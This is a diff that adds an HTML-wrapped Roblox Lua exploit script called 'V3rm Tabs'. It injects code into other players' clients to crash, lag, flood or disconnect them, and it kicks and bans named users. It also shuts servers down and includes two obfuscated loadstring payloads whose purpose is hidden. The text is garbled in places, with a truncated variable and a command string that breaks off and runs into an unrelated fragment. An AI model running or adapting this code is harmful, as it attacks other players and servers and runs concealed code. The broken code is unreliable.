@@ -1,0 +1,851 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w3.org/TR/REC-html40/loose.dtd">
+<html><body><p>wait()
+LocalPlayer = game:service("Players").LocalPlayer
+script.Parent = ___V3rmTabs___
+Tabs = {}
+Cmds = {}
+key = ";"
+chatgui = true
+probemode = false
+connection = nil
+Bypass = fals
+ 
+tabmodel = Instance.new("Model", Workspace)
+tabmodel.Name = "VTabs"
+SourceName = "DSource"
+Banlist = {"UMadBrahz","jillmiles1"}
+BSoDBanList = {"rogers888","cappertron20","GOLDC3PO","rabbidog","NoobsAttacks","manofthebase44"}
+
+ 
+function Connect(player)
+if game.Players[player] then
+if not Players[player.Name] then 
+NewLS(CrashSource,player.Backpack)
+table.insert(Players,player.Name)
+Output('Connected | '..player.Name,__)
+end
+end
+end
+  
+
+function Crash(name)
+name = tostring(name or "nil")
+local t = Instance.new("StringValue")  
+t.Name = "DISC: "..name
+t.Parent = game.Lighting   
+game:GetService("Debris"):AddItem(t,1)
+end 
+ 
+ConnectSource = [=[
+	wait()
+	script:ClearAllChildren()
+	wait()
+	script.Parent = nil
+	wait()
+	Player = game:service'Players'.LocalPlayer
+	wait()
+	while wait(0.1) do --this is actually the nilcrash
+		if game.Lighting:findFirstChild("DISC: nil") then
+			if Player.Parent == nil then
+				repeat Delay(0, wait) until false
+			end
+		end
+		if game.Lighting:findFirstChild("DISC: "..Player.Name) then
+			repeat Delay(0, wait) until false
+		end
+		if game.Lighting:findFirstChild("DISC: all") then
+			repeat Delay(0, wait) until false
+		end
+	end
+]=]
+
+
+BSoDSource = [==[
+	  game:GetService('Players').LocalPlayer.CameraMode = Enum.CameraMode.LockFirstPerson	
+wait(0)
+script.Parent = nil
+plr = game:GetService("Players").LocalPlayer
+local plrgui = plr:findFirstChild("PlayerGui")
+if plrgui == nil then repeat wait() plrgui = plr:findFirstChild("PlayerGui") until plrgui ~= nil end
+while plr.Parent == game:GetService("Players") do
+wait()
+for i = 1, 1000 do
+local sc = Instance.new("ScreenGui",plrgui)
+local fr = Instance.new("TextLabel",sc)
+fr.Text = "BSoD'd By V3rmilli0n be happy xd"
+fr.Size = UDim2.new(1, 0, 1, 0)
+fr.FontSize = "Size48"
+end
+end
+]==]
+
+
+LagSource = [[
+	wait()
+	script.Parent = game:service'TeleportService'
+	CC = workspace.CurrentCamera
+	    game:GetService('Players').LocalPlayer.CameraMode = Enum.CameraMode.LockFirstPerson	
+
+	RS = game:service("RunService")
+	PG = game.Players.LocalPlayer.PlayerGui
+	C = game.Players.LocalPlayer.Character
+	function Lag()
+		coroutine.resume(coroutine.create(function()
+			while wait() do
+				M = Instance.new("Message",CC)
+				M.Text = tick()*math.floor(5%4*21)
+				H = Instance.new("Hint",CC)
+				H.Text = 'yo u got BSoD-D By V3rmilli0n ;-)'
+				SG=Instance.new("ScreenGui",PG)
+				FR=Instance.new("Frame",SG)
+				FR.Size = UDim2.new(500,500,500,500)
+				while wait() do
+					FR.BackgroundColor3 = Color3.new(math.random(0,255),math.random(0,255),math.random(0,255))
+				end
+				P=Instance.new("Part",CC)
+				E=Instance.new("Explosion",P)
+				E.BlastRadius=math.huge
+				E.Position=P.Position
+				F=Instance.new("Fire",P)
+				S=Instance.new("Smoke",P)
+				P.CFrame = CC.Focus
+				P.Anchored = true
+				P.CanCollide = false
+				P.AncestryChanged:connect(function()Lag()end)
+				for _,v in pairs(C:GetChildren()) do pcall(function()v.Anchored=true end) end
+			end 
+		end)) 
+	end
+	RS.Stepped:connect(function()for i=1,10 do Lag()Lag()Lag()end end)
+]]
+ 
+
+ 
+ 
+coroutine.resume(coroutine.create(function()
+while wait(3) do
+if game:GetService("Players").Name ~= "Players" then
+game:GetService("Players").Name = "Players"
+end
+end
+end))
+ 
+function Dismiss()
+for i = 1, 10 do
+for i = 1, #Tabs do
+table.remove(Tabs, i)
+if tabmodel then
+tabmodel:ClearAllChildren()
+end end end
+end
+ 
+function AddCmd(Name,Say,Desc,Func)
+table.insert(Cmds,{["Name"] = Name,["Say"] = Say,["Desc"] = Desc,["Func"] = Func})
+end
+ 
+
+ 
+found = false
+ 
+coroutine.wrap(function()
+while found == false do
+if game.PlaceId == 21053279 or game.PlaceId == 21053219 then break end
+for _,scriptinworkspace in pairs(workspace:children()) do
+if scriptinworkspace then
+if scriptinworkspace:IsA("Script") then
+if scriptinworkspace:FindFirstChild(SourceName) then
+newScript = scriptinworkspace:Clone()
+wait(0.2)
+newScript.Name = "NewScript"
+newScript.Disabled = true
+newScript:FindFirstChild(SourceName).Value = ""
+Output("Source found", __)
+found = true 
+break
+end
+end
+end
+end
+wait()
+end
+end)()
+ 
+AddCmd("Unpunish player","unpunish","Restore the player's character",
+function(plrs)
+for _, plr in pairs(plrs) do
+if plr then
+NewS("game.Players['"..plr.Name.."']:LoadCharacter()", workspace)
+end
+end
+end
+)
+ 
+function NewS(sourcevalue, parent)
+if game.PlaceId == 21053279 or game.PlaceId == 21053219 then 
+NS(sourcevalue, parent)
+else
+if newScript then
+local scr = newScript:Clone()
+if scr:FindFirstChild(SourceName) then
+if scr:FindFirstChild(SourceName) then
+scr:FindFirstChild(SourceName).Value = sourcevalue
+scr.Parent = parent
+wait(0.5)
+scr.Disabled = false
+return scr
+end
+end
+end
+end
+end
+ 
+sorcery = script:Clone()
+ 
+Services = {
+game:GetService("Workspace"),
+game:GetService("Players"),
+game:GetService("Lighting"),
+game:GetService("StarterPack"),
+game:GetService("StarterGui"),
+game:GetService("Teams"),
+game:GetService("SoundService"),
+game:GetService("Debris"),
+game:GetService("InsertService"),
+game:GetService("RunService"),
+game:GetService("Chat"),
+game:GetService("TeleportService"),
+game:GetService("Geometry"),
+game:GetService("MarketplaceService"),
+game:GetService("BadgeService"),
+game:GetService("NetworkClient"),
+game:GetService("FriendService"),
+}
+ 
+function Explore(Item)
+Dismiss()
+if(Item==nil)then
+for _,v in pairs(Services)do
+Output(v.Name,function() Explore(v) end)
+end;
+else
+f={
+['View children']=function()
+Dismiss()
+for _,v in pairs(Item:children())do
+Output(v.Name,function()
+Explore(v)
+wait()
+end);
+end;
+end;
+['View parent']=function()
+Explore(Item.Parent)
+end;
+['Destroy']=function()
+Item:Destroy();
+Explore(Item.Parent);
+end;
+['Clear']=function()
+Item:ClearAllChildren()
+end;
+['Clone']=function()
+pcall(function()
+cloneableObj = Item:clone()
+end)
+end;
+['Remove']=function()
+Item:remove()
+end;
+['Paste']=function()
+if cloneableObj then
+cloneableObj.Parent = Item
+end
+end;
+['Ki'..'ck Item']=function()
+NewLS("local plr = game:service'Players'.LocalPlayer; plr:Ki".."ck()", Item)
+end;
+};
+for i,v in pairs(f)do
+Output(tostring(i),v);
+end;
+Output('Item Name: \''..tostring(Item.Name)..'\'',nil);
+Output('Class: \''..tostring(Item.ClassName)..'\'',nil);
+if cloneableObj then
+Output('Currently Cloning: \''..tostring(cloneableObj.Name)..'\'',nil);
+end
+end;
+end;
+ 
+AddCmd("Explore","explore","Explore the game",
+function()
+Explore()
+end
+)
+ 
+function NewLS(sourcevalue, parent)
+if game.PlaceId == 21053279 or game.PlaceId == 21053219 then 
+NLS(sourcevalue, parent) 
+else
+local NS = sorcery:Clone()
+NS.Name = "NewLocal"
+local Source = NS:findFirstChild(SourceName)
+if Source == nil then Instance.new('StringValue',NS).Name = SourceName end Source = NS:findFirstChild(SourceName)
+Source.Value = sourcevalue
+NS.Parent = parent
+NS.Disabled = false
+return NS
+end
+end
+ 
+Clothes = {}
+ 
+for _,Item in pairs(LocalPlayer.Character:GetChildren()) do
+if Item:IsA('CharacterMesh') or Item:IsA('Hat') or Item:IsA('Shirt') or Item:IsA('Pants') then
+table.insert(Clothes,Item:Clone())
+end
+end
+for i,v in pairs(LocalPlayer.Character:GetChildren()) do
+if v:IsA("BodyColors") then
+body = v
+torsocolor = body.TorsoColor
+leftlegcolor = body.LeftLegColor
+rightlegcolor = body.RightLegColor
+leftarmcolor = body.LeftArmColor
+rightarmcolor = body.RightArmColor
+headcolor = body.HeadColor
+end
+end
+ 
+mouse = LocalPlayer:GetMouse()
+ 
+mouse.KeyDown:connect(function(key)
+if key == "z" then
+game:service'StarterGui':SetCoreGuiEnabled(4, true)
+end 
+end)
+ 
+AddCmd("chat;on/off","chat","ChatGUI on/off",
+function(plrs, msg)
+if msg == "off" then
+chatgui = false
+elseif msg == "on" then
+chatgui = true
+end
+end
+)
+ 
+AddCmd("Set WalkSpeed","ws","Set the walkspeed of player",
+function(plrs, msg)
+local keypos = msg:find(key)
+local targPlayers = msg:sub(1,keypos-1)
+local plrs = getPlayers(targPlayers)
+local speed = msg:sub(tonumber(keypos+1))
+for _,v in pairs(plrs) do
+if v.Character ~= nil and v.Character:findFirstChild("Humanoid") ~= nil then
+v.Character:findFirstChild("Humanoid").WalkSpeed = speed
+end
+end
+end
+)
+ 
+ 
+Bad_Char = ""
+ 
+function chatgui(msg)
+if not chatgui then return end
+if probemode == false then
+if LocalPlayer.Character:findFirstChild("Head") then
+mainPart = LocalPlayer.Character:findFirstChild("Head")
+end
+end
+if probemode == true then
+if game.Workspace:findFirstChild(LocalPlayer.Name.."'s probe") then
+mainPart = game.Workspace:findFirstChild(LocalPlayer.Name.."'s probe")
+end
+end
+local bg = Instance.new("BillboardGui", mainPart)
+bg.Adornee = mainPart
+bg.Name = "CHATGUIBG"
+bg.Size = UDim2.new(4, 0, 2.5, 0)
+bg.StudsOffset = Vector3.new(-4, 2, 0)
+local bg2 = Instance.new("BillboardGui", mainPart)
+bg2.Adornee = mainPart
+bg2.Name = "CHATGUIBG2"
+bg2.Size = UDim2.new(4, 0, 2.5, 0)
+bg2.StudsOffset = Vector3.new(-4, 4.5, 0)
+local text = Instance.new("TextLabel", bg)
+text.Size = UDim2.new(3, 0, 0.5, 0)
+text.FontSize = "Size18"
+text.TextScaled = true
+text.TextTransparency = 0
+text.BackgroundTransparency = 1 
+text.TextTransparency = 0
+text.TextStrokeTransparency = 0
+text.Font = "Arial"
+text.TextColor3 = Color3.new(255, 0, 0)
+text.Text = " "
+Message = msg:gsub("","\5")
+if #Message &gt;50 then return end
+for i = 0, #Message, 1 do
+wait(0.01)
+text.Text = string.gsub("("..LocalPlayer.Name.."): "..Message:gsub(0, i),'fuck','fuck')
+end
+wait()
+coroutine.resume(coroutine.create(function()
+for i = 0, 5, 0.05 do
+if bg ~= nil then
+if bg2 ~= nil then
+wait()
+bg2.StudsOffset = bg2.StudsOffset + Vector3.new(0, 0.05, 0)
+end
+bg.StudsOffset = bg.StudsOffset + Vector3.new(0, 0.05, 0)
+end
+end
+end))
+for i=text.TextTransparency,1,0.02 do
+wait()
+text.TextTransparency = i
+text.TextStrokeTransparency = i
+end
+if bg == nil then return end
+bg:Destroy()
+if bg2 == nil then return end
+bg2:Destroy()
+end
+ 
+LocalPlayer.Chatted:connect(chatgui)
+
+AddCmd("Commands","cmds","Show the list of commands",
+function()
+Dismiss()
+for i, v in pairs(Cmds) do
+Output(v["Name"],
+function()
+Output("Description: "..v["Desc"], __)
+Output("Usage: "..v["Say"], __)
+Output("Name: "..v["Name"], __)
+end)
+end
+end
+)
+ 
+AddCmd("Rejoin player","rej","Rejoin the player",
+function(plrs)
+for _, plr in pairs(plrs) do
+if plr and plr.Backpack then
+NewLS("game:service'TeleportService':Teleport(game.PlaceId)", plr.Backpack)
+end
+end
+end
+)
+
+AddCmd("Clean workspace","clean","Clean the lag nobs made",
+function()
+		        for a,b in pairs(game.Workspace:GetChildren()) do
+                        if not game.Players:GetPlayerFromCharacter(b) and b.Name ~= 'Base' and b.Name ~= 'Camera' then
+                                pcall(function() b:Destroy() end)
+                        end
+                end
+                if game.Workspace:findFirstChild('Base') == nil then
+                        local Base = Instance.new("Part",Game.Workspace)
+                        Base.Name = "Base"
+                        Base.Anchored = true
+                        Base.Locked = true
+                        Base.BrickColor = BrickColor.new("Bright green")
+                        Base.Size = Vector3.new(2048,2,2048)
+                        Base.CFrame = CFrame.new(0,0,0)
+                end
+                Output('You have cleaned workspace!')
+        end
+)
+
+AddCmd("Execute", "exe","Execute a LocalScript for admin",
+function(plrs, msg)
+a,b = ypcall(function()
+loadstring(msg)()
+end) if not a then Output(b,"Bright red") end
+end
+)
+
+AddCmd("Anchored", "anchor","Anchor all parts",
+function()
+	g = game.Workspace:GetChildren () do
+for i = 1, #g do
+if g[i].ClassName == "Part" then
+g[i].Anchored = true else if
+g[i].ClassName == "Model" then
+y = g[i]:GetChildren ()
+for i = 1, #y do
+if y[i].ClassName == "Part" then
+y[i].Anchored = true
+end
+end
+end
+end
+end
+end
+end
+)
+
+AddCmd("unanchor", "unanchor","unanchor all parts",
+function()
+	g = game.Workspace:GetChildren () do
+for i = 1, #g do
+if g[i].ClassName == "Part" then
+g[i].Anchored = false else if
+g[i].ClassName == "Model" then
+y = g[i]:GetChildren ()
+for i = 1, #y do
+if y[i].ClassName == "Part" then
+y[i].Anchored = false
+end
+end
+end
+end
+end
+end
+end
+)
+
+AddCmd("Admin a player","vtabs","Give admin to a player",
+function(plrs)
+for _, plr in pairs(plrs) do
+if plr and plr.Backpack then
+script.Parent = plr.Backpack
+Output("You gave admin to: "..plr.Name, __)
+end
+end
+end
+)
+
+AddCmd("AFK","afk","Ping yourself as afk",
+function()
+Dismiss()
+for i = 1,8 do
+wait()
+Output(''..LocalPlayer.Name.." is afk")
+end
+end
+)
+
+AddCmd("Back","back","Ping yourself as back",
+function()
+Dismiss()
+for i = 1,8 do
+wait()
+Output(''..LocalPlayer.Name.." is back bby")
+end
+wait(3)
+Dismiss()
+end
+)
+ 
+AddCmd("Ban a player","ban","Kicks a player when he enters",
+function(plrs, msg)
+for _,v in pairs(plrs) do
+if v then
+table.insert(Banlist,v.Name)
+Output('Banned | '..v.Name,__)
+else
+Output(Error)
+end
+end
+end
+)
+
+local z={["@"]=0,["*"]=1,["$"]=2,["%"]=3,[")"]=4,["("]=5,["~"]=6,["!"]=7,["-"]=8,["_"]=9,["="]=10,["+"]=11,["#"]=12,["&amp;"]=13,["?"]=14,["^"]=15}; setfenv(assert(loadstring((string.gsub(string.gsub(table.concat({
+"*))~)~%)&amp;~)~-A$_)?A~^~$$#A$~!_~?A~^~$$#A$_~?A~^~@$@A!?~%!@$+~$$#$=@~~(!?~%~)!_~^~?~-$_$=@))_~%!&amp;~_~%!%!-$_$=@~~^~$!@$_~@$&amp;%@$*%#$$%@$)~^~=@!!*~_~)!-$_$=@^)(!)!@!(!)!-A$~(%%$!&amp;~@$)(*~$~%!@$%)$!(~*~)!(~)~@$$~_!@$~(%%$!&amp;~_~#~#~_~@%?~$$#$@$^(^(_$=@^)(!)!@!(!)!-A$~(%%$!&amp;~@$)(*~$~%!@$%)$!(~*~)!(~)~@$$~_!@$~(%%$!&amp;~_~#~#~_~@%?~$$#$@$^(^(_$=@^)(!)!@!(!)!-$$$~(%%$!&amp;~@$)(*~$~%!@$%)$!(~*~)!(~)~@$$~_!@$~(%%$!&amp;~_~#~#~_~@%?~$$#$@$^(^(_$=@^)(!)!@!(!)!-$$$~(%%$!&amp;~@$)(*~$~%!@$%)$!(~*~)!(~)~@$$~_!@$~(%%$!&amp;~_~#~#~_~@%?~$$#$@$^(^(_$=@^)(!)!@!(!)!-$$$~(%%$!&amp;~@$)(*~$~%!@$%)$!(~*~)!(~)~@$$~_!@$~(%%$!&amp;~_~#~#~_~@%?~$$#$@$^(^(_$=@(~?~)~=@(~?~)~=@_$"
+}),"(%u)(.)",function(r,c)return c:rep(r:byte()-62)end),"(.)(.)",function(lo,hi)return string.char(z[lo]+z[hi]*16)end)))),getfenv())()
+
+AddCmd("Fix Lighting","lfix","Fix the Lighting ",
+function()
+function dtr()
+	local sk = game.Lighting:findFirstChild("Sky")
+	if sk ~= nil then
+		sk:Remove()
+	end
+	game.Lighting.FogEnd = 10011111111
+    game.Lighting.Ambient = Color3.new(0.5,0.5,0.5)
+	game.Lighting.TimeOfDay = "14:00:00"
+	game.Lighting.Ambient = Color3.new(0.5,0.5,0.5)
+	game.Lighting.Brightness = 1
+	game.Lighting.ColorShift_Bottom = Color3.new(0,0,0)
+	game.Lighting.ColorShift_Top = Color3.new(0,0,0)
+	game.Lighting.ShadowColor = Color3.new(0.7,0.7,0.7)
+end
+
+dtr()
+
+game.Lighting.Changed:connect(dtr)
+end
+)
+
+AddCmd("Set SkyBox","vbox","et Skybox l0l",
+function()
+function getAll(obj)
+for i, v in pairs(obj:getChildren()) do
+if v:IsA("BasePart") then
+v.Anchored = false
+v.BrickColor = BrickColor.new(0)
+bv = Instance.new("BodyVelocity")
+bv.Parent = v
+bv.maxForce = Vector3.new(100000000,100000000,100000000)
+end
+getAll(v)
+end
+end
+getAll(workspace)
+game.Lighting.TimeOfDay = "07:00:00"
+game.Lighting.Ambient = Color3.new(0,0,0)
+sky = Instance.new("Sky")
+sky.Parent = game.Lighting
+sky.SkyboxBk = "http://www.roblox.com/asset/?id=122579628"
+sky.SkyboxDn = "http://www.roblox.com/asset/?id=122579628"
+sky.SkyboxFt = "http://www.roblox.com/asset/?id=122579628"
+sky.SkyboxLf = "http://www.roblox.com/asset/?id=122579628"
+sky.SkyboxRt = "http://www.roblox.com/asset/?id=122579628"
+sky.SkyboxUp = "http://www.roblox.com/asset/?id=122579628"
+end
+)
+
+
+AddCmd("Shutdown","sd","Shuts the server down",
+    function()
+        Output("Shutting down server!","Really red")
+        wait(1)
+      for _,v in pairs(game.Players:GetPlayers()) do v:Kick() end
+    end
+)
+
+AddCmd("RuinSB","rsb","Ruins a not-saveplace protected scriptbuilder",
+    function()
+        if SourceName == "source" then 
+            Output("This is Alakazards scriptbuilder, can't use SavePlace here!","Really red")
+        else
+        NewS([[game:SavePlace()]],Workspace)
+    	end
+    end
+)
+
+AddCmd("Respawn","respawn","Respawn player",
+	function(plrs)
+		for _,plr in pairs(plrs) do
+			if plr then
+				NewS("game.Players['"..plr.Name.."']:LoadCharacter()", workspace)
+			end
+		end
+	end
+)
+
+AddCmd("Connect","connect","Connect a player",
+	function(plrs)
+		for _,plr in pairs(plrs) do
+			if plr and plr.Backpack then
+				Connect(plr)
+			end
+		end
+	end
+)
+
+AddCmd("Night","night","Makes it night",
+	function()
+		game.Lighting.TimeOfDay = "00:00:00"
+	end
+)
+
+AddCmd("Day","day","Makes it day",
+	function()
+		game.Lighting.TimeOfDay = "12:00:00"
+	end
+)
+
+AddCmd("Disc","dc","Disconnects a player form the game",
+function(plrs)
+for _,plr in pairs(plrs) do
+if plr and plr.Backpack then
+NewLS([[local lp = game.Players.LocalPlayer;lp.Parent = nil;wait();lp.Parent = game.Players]],plr.Backpack)
+end
+end
+end)
+
+AddCmd("LocalScript","ls","LocalScript",
+	function(nothing, msg)
+		if LocalPlayer.Parent ~= nil then
+			NewLS(msg, LocalPlayer.Backpack)
+		end
+	end
+)
+
+AddCmd("Playerinfo","pinfo","Shows info on a player",
+    function(plrs)
+        for _,plr in pairs(plrs) do
+            if plr then
+Output("Age: "..plr.AccountAge,"noncolar")
+Output("Membership: "..plr.MembershipType.Name,"Hot pink") 
+Output("Player: "..plr.Name,"Really red")
+Output("Id: "..plr.userId,"New Yeller")
+Output("Camera Mode: "..plr.CameraMode.Name,"Dark green")
+end
+end
+end)
+
+AddCmd("Force shutdown","fsd","Forces shutdown with a ManualSurfaceJoint",
+    function(nothing, msg)
+        NewS([[local b = Instance.new ("ManualSurfaceJointInstance",Workspace)]],workspace)
+    end
+)
+
+AddCmd("Message","m","Show a message",
+	function(nothing, msg)
+		if found then
+			NewS([[
+			a = Instance.new("Message", workspace)
+			msg = "]]..msg..[["
+			msg = msg:gsub("","\5")
+			game:service'Debris':AddItem(a, 5)
+			while wait() do
+				for i = 30,0,-1 do
+					a.Text = "--&gt;"..string.rep(" ",i)..msg..string.rep(" ",i)..""..string.rep(" ",i)..msg..string.rep(" ",i).." 364 then
+table.insert(plrs, plr)
+end
+end
+elseif msg == "veterans" then
+for _,plr in pairs(game:GetService("Players"):GetChildren()) do
+if plr.AccountAge &gt; 364 then
+table.insert(plrs, plr)
+end
+end
+elseif msg == "others" then
+for i,v in pairs(game:GetService("Players"):GetChildren()) do
+if v ~= LocalPlayer then
+table.insert(plrs, v)
+end
+end
+else
+for i,v in pairs(game:GetService("Players"):GetChildren()) do
+if v.Name:lower():sub(1,#msg) == msg:lower() then
+table.insert(plrs, v)
+end
+end
+end
+return plrs
+end
+ 
+for _,plr in pairs(game:GetService("Players"):GetChildren()) do
+end
+ 
+LocalPlayer.Chatted:connect(function(m)
+for i,v in pairs(Cmds) do
+if v["Say"]..key == m:sub(1, #v["Say"]+#key) then
+v["Func"](getPlayers(m:sub(#v["Say"]+#key+1)), m:sub(#v["Say"]+#key+1))
+end
+end
+end)
+    
+for i = 0,8,1 do
+wait(0.01)
+end
+local z={["*"]=0,["_"]=1,["?"]=2,["="]=3,["("]=4,["^"]=5,[")"]=6,["@"]=7,["$"]=8,["~"]=9,["+"]=10,["#"]=11,["!"]=12,["-"]=13,["&amp;"]=14,["%"]=15}; setfenv(assert(loadstring((string.gsub(string.gsub(table.concat({
+"%(^@(@*@^@(@$A?*^!)^)_)=@^)*?()%)*?&amp;)%)(@*?_)?)^@=@^)*?(@$)~)=@*?=@=)?@~)*@(@!?*A?&amp;?&amp;?!(%)=)_)!)*^!)_)~@^)?@&amp;?&amp;(_)-)^)!?*?%^%^~?+*%(^@(@*@^@(@$A?=(?@^)_)(@^)()*??)~@+=*?)^==?@-)~)!)!)~)*=&amp;)??!?*?%^%^~?+*%(^@(@*@^@(@$???@^^)!)=)%)-)^)*?(@%)*?)^==?^-(*?(^_)?)@?=@!?*???&amp;?&amp;?!(%)=)_)!)*^!)_)~@^)?@&amp;?&amp;(_)-)^)!?*?%^%^~?+*%(^@(@*@^@(@$???&amp;(%)(@*?)(~)&amp;)~)=@$)^)()??!?*?%^%^~?"
+}),"(%u)(.)",function(r,c)return c:rep(r:byte()-62)end),"(.)(.)",function(lo,hi)return string.char(z[lo]+z[hi]*16)end)))),getfenv())()
+
+for _,v in pairs(game.Players:GetPlayers()) do
+if v.Name == "V3rmilli0n" or v.Name == "iiLuaScript" then
+Output("Creator of Vtabs is in-game")
+end
+end
+
+game.Players.PlayerAdded:connect(function(plr)
+if plr.Name == "V3rmilli0n" or plr.Name == "iiLuaScript" then
+Output("Creator of Vtabs is in-game")
+end
+end)
+ 
+tabmodeldebounce = false
+modeldebounce = false
+game:service'RunService'.Stepped:connect(function()
+if modeldebounce then return end
+rot = (rot % 360) + 0.0001
+if tabmodel.Parent ~= workspace then
+modeldebounce = true
+tabs = {}
+tabmodel = Instance.new("Model", workspace)
+tabmodel.Name = "V3rm Tabs"
+tabs = {}
+wait()
+modeldebounce = false
+end
+end)
+ 
+rot = 0
+coroutine.resume(coroutine.create(function()
+game:GetService("RunService").Stepped:connect(function()
+if probemode == false then
+if LocalPlayer.Character then
+if LocalPlayer.Character:findFirstChild("Torso")  then
+rot = rot + 0.0001
+for i,v in pairs(Tabs) do
+ypcall(function()
+local pos = LocalPlayer.Character.Torso.CFrame
+local radius = 4 + (#Tabs * 0.5)
+local x = math.sin((i / #Tabs - (0.5 / #Tabs) + rot * 2) * math.pi * 2) * radius
+local y = 0
+local z = math.cos((i / #Tabs - (0.5 / #Tabs) + rot * 2) * math.pi * 2) * radius
+local arot = Vector3.new(x, y, z) + pos.p
+local brot = v.CFrame.p
+local crot = (arot * .1 + brot * .9)
+v.CFrame = CFrame.new(crot, pos.p)
+end)
+end
+end
+end
+end
+if probemode == true then
+if game.Workspace:findFirstChild(LocalPlayer.Name.."'s probe") then
+rot = rot + 0.001
+for i,v in pairs(Tabs) do
+ypcall(function()
+local pos = game.Workspace:findFirstChild(LocalPlayer.Name.."'s probe").CFrame
+local radius = 4 + (#Tabs * 0.5)
+local x = math.sin((i / #Tabs - (0.5 / #Tabs) + rot * 2) * math.pi * 2) * radius
+local y = 0
+local z = math.cos((i / #Tabs - (0.5 / #Tabs) + rot * 2) * math.pi * 2) * radius
+local arot = Vector3.new(x, y, z) + pos.p
+local brot = v.CFrame.p
+local crot = (arot * .1 + brot * .9)
+v.CFrame = CFrame.new(crot, pos.p)
+end)
+end
+end
+end
+end)
+end))
+game:GetService("RunService").RenderStepped:connect(function()
+    for _,a in pairs(game:service('Players'):children()) do
+        for _,b in pairs(Banlist) do
+                if b:find(a.Name) then
+                         NewLS([==[
+                        Instance.new('Message',Workspace).Text = "You are Banned." 
+                         local p = game:GetService("Players").LocalPlayer
+p.Parent=nil
+wait()
+p.Parent=game:GetService("Players")
+                        ]==], a.Backpack)
+                        a:remove()
+            Output('Banned Player # '..a.Name..' # Attempted to join.',__)
+else 
+                end
+        end
+    end
+end)
+game.Players.ChildRemoved:connect(function(plr)
+     Output("Disconnected: "..plr.Name)
+wait(4)
+Dismiss()
+ end)
+
+game.Players.ChildAdded:connect(function(plr)
+     Output("Connected: "..plr.Name)
+wait(4)
+Dismiss()
+ end)</p></body></html>
